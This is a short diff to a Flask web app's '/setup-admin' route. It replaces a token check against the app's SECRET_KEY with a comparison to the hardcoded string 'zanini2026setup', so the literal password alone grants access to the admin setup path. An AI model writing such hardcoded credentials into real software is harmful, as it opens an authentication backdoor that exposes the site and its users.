@@ -995,8 +995,7 @@ def buy_now(uid):
 @app.route('/setup-admin')
 def setup_admin():
     token = request.args.get('token', '')
-    secret = app.config.get('SECRET_KEY', '')
-    if not token or token != secret[:16]:
+    if token != 'zanini2026setup':
         abort(403)
     from modules.models import User
     admin = User.query.filter_by(role='admin').first()
